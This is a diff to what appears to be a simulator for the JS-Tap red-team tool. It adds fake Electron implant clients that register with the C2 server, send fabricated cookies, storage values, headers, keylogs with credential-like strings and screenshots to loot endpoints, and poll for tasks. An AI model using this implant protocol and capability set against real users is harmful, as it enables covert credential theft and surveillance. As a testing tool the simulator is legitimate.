@@ -43,6 +43,11 @@ MAC_SAFARI_UA = (
     "(KHTML, like Gecko) Version/17.2 Safari/605.1.15"
 )
 
+ELECTRON_SLACK_UA = "AtomBeacon/1.0 (Linux 6.6.99; x64) Electron/33.0.0 Node/v20.18.0"
+ELECTRON_VSCODE_UA = "AtomBeacon/1.0 (Windows NT 10.0; x64) Electron/32.2.1 Node/v20.15.1"
+ELECTRON_DISCORD_UA = "AtomBeacon/1.0 (Darwin 23.4.0; arm64) Electron/31.7.5 Node/v20.14.0"
+ELECTRON_OBSIDIAN_UA = "AtomBeacon/1.0 (Linux 6.8.0; x64) Electron/32.0.0 Node/v20.16.0"
+
 # ── Client profiles ────────────────────────────────────────────────────────────
 
 CLIENT_PROFILES = [
@@ -232,6 +237,92 @@ BEACON_PROFILES = [
     {"count": 2, "tag": "internal", "user_agent": WIN_CHROME_UA,    "label": "Bex/Win/Chrome"},
     {"count": 1, "tag": "",         "user_agent": MAC_SAFARI_UA,    "label": "Bex/Mac/Safari"},
 ]
+
+# ── Electron client profiles ─────────────────────────────────────────────────
+
+ELECTRON_PROFILES = [
+    {"count": 1, "tag": "internal", "user_agent": ELECTRON_SLACK_UA,    "label": "Atom/Slack"},
+    {"count": 1, "tag": "dev",      "user_agent": ELECTRON_VSCODE_UA,   "label": "Atom/VSCode"},
+    {"count": 1, "tag": "",         "user_agent": ELECTRON_DISCORD_UA,  "label": "Atom/Discord"},
+    {"count": 1, "tag": "dev",      "user_agent": ELECTRON_OBSIDIAN_UA, "label": "Atom/Obsidian"},
+]
+
+# ── Fake electron data pools ─────────────────────────────────────────────────
+
+FAKE_ELECTRON_DOMAINS = [
+    "app.slack.com", "discord.com", "github.dev", "obsidian.md",
+    "marketplace.visualstudio.com", "teams.microsoft.com", "notion.so", "figma.com",
+]
+
+FAKE_ELECTRON_PATHS = {
+    "app.slack.com":                ["/client/T0123ABC/C0456DEF", "/files/U789GHI/F012JKL", "/admin/settings", "/archives/C0456DEF/p1700000000"],
+    "discord.com":                  ["/channels/123456789/987654321", "/api/v9/users/@me", "/settings/appearance", "/guild-discovery"],
+    "github.dev":                   ["/user/repo/blob/main/src/index.ts", "/user/repo/pull/42", "/codespaces/new", "/settings/tokens"],
+    "obsidian.md":                  ["/vault/notes/daily/2026-02-15.md", "/vault/templates/meeting-notes.md", "/plugins/community", "/settings/sync"],
+    "marketplace.visualstudio.com": ["/items?itemName=ms-python.python", "/manage/publishers/my-org", "/api/v1/extensions", "/search?query=theme"],
+    "teams.microsoft.com":         ["/v2/conversations/19:meeting_abc@thread.v2", "/api/chats", "/files/shared", "/calendar/view/workweek"],
+    "notion.so":                    ["/workspace/abc123/Project-Roadmap", "/api/v1/blocks", "/settings/members", "/templates/gallery"],
+    "figma.com":                    ["/file/abc123/Design-System", "/proto/def456", "/files/team/789", "/settings/billing"],
+}
+
+FAKE_KEYLOGS = [
+    {"keys": "admin@corp.com\tP@ssw0rd!2026\r", "target": "INPUT#email[type=email]", "url": "https://app.slack.com/client/T0123ABC"},
+    {"keys": "ssh-rsa AAAAB3NzaC1yc2EAAAA", "target": "TEXTAREA#snippet-content", "url": "https://github.dev/user/repo/blob/main/.ssh/authorized_keys"},
+    {"keys": "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG", "target": "TEXTAREA.terminal-input", "url": "https://github.dev/codespaces/terminal"},
+    {"keys": "vault password: Tr3@sure-Hunt3r", "target": "INPUT#vault-password[type=password]", "url": "https://obsidian.md/vault/settings/sync"},
+    {"keys": "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh", "target": "INPUT#token-field[type=text]", "url": "https://github.dev/settings/tokens/new"},
+    {"keys": "SELECT * FROM users WHERE role='admin'", "target": "TEXTAREA.query-editor", "url": "https://notion.so/workspace/abc123/Database-Query"},
+]
+
+FAKE_RESPONSE_HEADERS = [
+    ("Set-Cookie", "session=eyJhbGciOiJIUzI1NiJ9.abc123; Path=/; HttpOnly; Secure"),
+    ("X-Internal-Service", "auth-gateway-prod-us-east-1"),
+    ("X-Request-ID", "req-7f3a9c2e-4b8d-11ee-be56-0242ac120002"),
+    ("X-Ratelimit-Remaining", "47"),
+    ("Server", "envoy/1.28.0"),
+    ("X-Backend-Server", "api-worker-3.internal.corp.net:8443"),
+    ("X-Debug-Token", "prof_abc123_1700000000"),
+    ("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline' cdn.example.com"),
+]
+
+ELECTRON_STATUS_PROFILES = {
+    "Atom/Slack": {
+        "hostname": "dev-workstation-01", "platform": "linux", "arch": "x64",
+        "username": "wizard", "homedir": "/home/wizard",
+        "capabilities": ["file_browser", "shell", "screenshot", "cookies", "headers", "renderer_injection"],
+        "windows": [
+            {"id": 1, "url": "https://app.slack.com/client/T0123ABC/C0456DEF", "title": "Slack - #general", "injected": True},
+            {"id": 2, "url": "https://app.slack.com/client/T0123ABC/D789GHI", "title": "Slack - DM: Alice", "injected": True},
+        ],
+    },
+    "Atom/VSCode": {
+        "hostname": "DESKTOP-A1B2C3D", "platform": "win32", "arch": "x64",
+        "username": "dev-user", "homedir": "C:\\Users\\dev-user",
+        "capabilities": ["file_browser", "shell", "screenshot", "headers", "renderer_injection"],
+        "windows": [
+            {"id": 1, "url": "https://github.dev/user/repo/blob/main/src/index.ts", "title": "index.ts - repo - Visual Studio Code", "injected": True},
+            {"id": 2, "url": "vscode-webview://webviewId/settings", "title": "Settings", "injected": False},
+        ],
+    },
+    "Atom/Discord": {
+        "hostname": "macbook-pro.local", "platform": "darwin", "arch": "arm64",
+        "username": "gamer", "homedir": "/Users/gamer",
+        "capabilities": ["file_browser", "shell", "screenshot", "cookies", "headers", "renderer_injection"],
+        "windows": [
+            {"id": 1, "url": "https://discord.com/channels/123456789/987654321", "title": "Discord - #lobby", "injected": True},
+        ],
+    },
+    "Atom/Obsidian": {
+        "hostname": "notes-station", "platform": "linux", "arch": "x64",
+        "username": "researcher", "homedir": "/home/researcher",
+        "capabilities": ["file_browser", "shell", "screenshot", "renderer_injection"],
+        "windows": [
+            {"id": 1, "url": "app://obsidian.md/vault/notes/daily/2026-02-15.md", "title": "Obsidian - Daily Note", "injected": True},
+            {"id": 2, "url": "app://obsidian.md/plugins/community", "title": "Obsidian - Community Plugins", "injected": False},
+            {"id": 3, "url": "app://obsidian.md/vault/templates/meeting-notes.md", "title": "Obsidian - Templates", "injected": True},
+        ],
+    },
+}
 
 # ── Screenshot data ────────────────────────────────────────────────────────────
 
@@ -667,6 +758,198 @@ class SimBeaconClient:
         })
 
 
+# ── SimElectronClient ─────────────────────────────────────────────────────────
+
+class SimElectronClient(SimBeaconClient):
+    """Simulates an atom-beacon Electron client with encrypted comms."""
+
+    def __init__(self, index, label, tag, user_agent, server):
+        super().__init__(index, label, tag, user_agent, server)
+        self.client_type = "electron"
+
+    async def register(self, session):
+        tag_path = f"/{self.tag}" if self.tag else ""
+        url = f"{self.server}/client/getToken{tag_path}/atom-beacon"
+        headers = {"User-Agent": self.user_agent}
+        try:
+            async with session.get(url, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    self.uuid = data["clientToken"]
+                else:
+                    print(f"  [!] Electron {self.index} registration failed: HTTP {resp.status}")
+        except Exception as e:
+            print(f"  [!] Electron {self.index} registration error: {e}")
+
+    async def _report_status(self, session):
+        """Send atom-beacon status with capabilities and window list."""
+        profile = ELECTRON_STATUS_PROFILES.get(self.label, {})
+        await self._send_encrypted(session, "/beacon/status", {
+            "supported": True,
+            "hostname": profile.get("hostname", "unknown"),
+            "platform": profile.get("platform", "linux"),
+            "arch": profile.get("arch", "x64"),
+            "username": profile.get("username", "user"),
+            "homedir": profile.get("homedir", "/home/user"),
+            "capabilities": profile.get("capabilities", []),
+            "windows": profile.get("windows", []),
+        })
+
+    async def _send_encrypted_screenshot(self, session):
+        """Send screenshot PNG via encrypted channel."""
+        if not self.send_key:
+            return
+        try:
+            with open(SCREENSHOT_PATH, "rb") as f:
+                img_data = f.read()
+            # Screenshots go via /loot/screenshot which expects raw image bytes as the message
+            # But the encrypted channel wraps everything in JSON, so base64-encode the image
+            img_b64 = base64.b64encode(img_data).decode("utf-8")
+            await self._send_encrypted(session, "/loot/screenshot", {"image": img_b64})
+        except Exception:
+            pass
+
+    async def send_loot_round(self, session):
+        if not self.uuid or not self.send_key:
+            return
+
+        # Report full atom-beacon status
+        await self._report_status(session)
+
+        # Pick 1-3 random Electron domains
+        domains = random.sample(FAKE_ELECTRON_DOMAINS, random.randint(1, 3))
+
+        for domain in domains:
+            paths = FAKE_ELECTRON_PATHS.get(domain, ["/"])
+            path = random.choice(paths)
+            full_url = f"https://{domain}{path}"
+
+            # Visit report
+            await self._send_encrypted(session, "/bex/report", {
+                "visits": [{"domain": domain, "url": full_url}],
+            })
+
+            # Cookies (1-2)
+            for name, value, metadata in random.sample(FAKE_BEACON_COOKIES, random.randint(1, 2)):
+                await self._send_encrypted(session, "/bex/capture", {
+                    "domain": domain, "type": "cookie",
+                    "name": name, "value": value, "url": full_url, "metadata": metadata,
+                })
+
+            # localStorage
+            key, value = random.choice(FAKE_BEACON_LOCAL_STORAGE)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain, "type": "local_storage",
+                "name": key, "value": value, "url": full_url,
+            })
+
+            # sessionStorage
+            key, value = random.choice(FAKE_BEACON_SESSION_STORAGE)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain, "type": "session_storage",
+                "name": key, "value": value, "url": full_url,
+            })
+
+            # Request headers
+            hdr_name, hdr_value = random.choice(FAKE_BEACON_HEADERS)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain, "type": "header",
+                "name": hdr_name, "value": hdr_value, "url": full_url,
+            })
+
+            # Response headers
+            rh_name, rh_value = random.choice(FAKE_RESPONSE_HEADERS)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain, "type": "response_header",
+                "name": rh_name, "value": rh_value, "url": full_url,
+            })
+
+        # Keylogs (1-2 entries)
+        for keylog in random.sample(FAKE_KEYLOGS, random.randint(1, 2)):
+            await self._send_encrypted(session, "/loot/keylog", keylog)
+
+        # Screenshot via encrypted channel
+        await self._send_encrypted_screenshot(session)
+
+        # Report sidecar status (atom-beacon has built-in capabilities)
+        await self._send_encrypted(session, "/bex/sidecar/status", {"supported": True, "connected": True})
+
+    async def poll_tasks(self, session):
+        """Poll for tasks, handling atom-beacon specific task types."""
+        if not self.uuid or not self.send_key:
+            return []
+
+        resp_data = await self._send_encrypted(session, "/client/taskCheck", {})
+        if not resp_data:
+            return []
+
+        new_labels = []
+
+        metric_data = resp_data.get("metricData")
+        if not metric_data:
+            return []
+
+        parts = metric_data.split(",")
+        if len(parts) != 2:
+            return []
+
+        try:
+            iv = base64.b64decode(parts[0])
+            ciphertext = base64.b64decode(parts[1])
+            aesgcm = AESGCM(self.receive_key)
+            plaintext = aesgcm.decrypt(iv, ciphertext, None)
+            tasks = json.loads(plaintext.decode("utf-8"))
+        except Exception:
+            return []
+
+        if not isinstance(tasks, list):
+            return []
+
+        for task in tasks:
+            code_b64 = task.get("data", "")
+            try:
+                code_bytes = base64.b64decode(code_b64)
+                code_text = code_bytes.decode("utf-8", errors="replace")
+            except Exception:
+                code_text = code_b64
+
+            try:
+                task_json = json.loads(code_text)
+                task_type = task_json.get("type", "")
+
+                if task_type == "SIDECAR_COMMAND":
+                    label = self._handle_sidecar_command(session, task_json)
+                    new_labels.append(label)
+                    self.sidecar_commands.append(label)
+                    await self._send_sidecar_result(session, task_json)
+                    continue
+
+                if task_type == "SCREENSHOT":
+                    label = "screenshot"
+                    new_labels.append(label)
+                    self.sidecar_commands.append(label)
+                    await self._send_encrypted_screenshot(session)
+                    continue
+
+                if task_type == "SCREENSHOT_SETTINGS":
+                    label = "screenshot_settings"
+                    new_labels.append(label)
+                    self.sidecar_commands.append(label)
+                    # ACK — no real settings to apply in simulator
+                    continue
+
+            except (json.JSONDecodeError, TypeError):
+                pass
+
+            # Fallback: treat as custom payload
+            label = SimClient._extract_label(code_text)
+            new_labels.append(label)
+            self.sidecar_commands.append(label)
+            await self._ack_payload(session, code_text)
+
+        return new_labels
+
+
 # ── StatusGrid ─────────────────────────────────────────────────────────────────
 
 class StatusGrid:
@@ -690,7 +973,7 @@ class StatusGrid:
         lines.append(f"\u2550{bar}")
         lines.append(f"  JS-Tap Client Simulator{' ' * 33}{registered} clients registered")
         lines.append(f"\u2550{bar}")
-        lines.append(f"  {'#':>2}  {'Type':<5} {'Label':<14} {'Tag':<9} {'UUID':<12} Payloads / Sidecar Cmds")
+        lines.append(f"  {'#':>2}  {'Type':<8} {'Label':<14} {'Tag':<9} {'UUID':<12} Payloads / Sidecar Cmds")
         lines.append(f" \u2500{thin}")
 
         for c in self.clients:
@@ -699,7 +982,7 @@ class StatusGrid:
             if len(payloads_str) > 36:
                 payloads_str = payloads_str[:33] + "..."
             lines.append(
-                f"  {c.index:>2}  {ctype:<5} {c.label:<14} {c.tag:<9} {c.uuid_short:<12} {payloads_str}"
+                f"  {c.index:>2}  {ctype:<8} {c.label:<14} {c.tag:<9} {c.uuid_short:<12} {payloads_str}"
             )
 
         lines.append(f" \u2500{thin}")
@@ -714,8 +997,8 @@ class StatusGrid:
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 
-def build_clients(server, include_beacons=True):
-    """Build the list of SimClient and SimBeaconClient instances."""
+def build_clients(server, include_beacons=True, include_electrons=True):
+    """Build the list of SimClient, SimBeaconClient, and SimElectronClient instances."""
     clients = []
     idx = 1
     for profile in CLIENT_PROFILES:
@@ -741,6 +1024,18 @@ def build_clients(server, include_beacons=True):
                 ))
                 idx += 1
 
+    if include_electrons:
+        for profile in ELECTRON_PROFILES:
+            for _ in range(profile["count"]):
+                clients.append(SimElectronClient(
+                    index=idx,
+                    label=profile["label"],
+                    tag=profile["tag"],
+                    user_agent=profile["user_agent"],
+                    server=server,
+                ))
+                idx += 1
+
     return clients
 
 
@@ -756,9 +1051,12 @@ async def main():
                         help="Register and poll only, skip sending fake loot")
     parser.add_argument("--no-beacons", action="store_true",
                         help="Skip beacon clients, only run app (js-implant) clients")
+    parser.add_argument("--no-electrons", action="store_true",
+                        help="Skip electron clients, only run app and beacon clients")
     args = parser.parse_args()
 
-    clients = build_clients(args.server, include_beacons=not args.no_beacons)
+    clients = build_clients(args.server, include_beacons=not args.no_beacons,
+                            include_electrons=not args.no_electrons)
     grid = StatusGrid(clients)
 
     print(f"\n  Registering {len(clients)} clients with {args.server} ...\n")
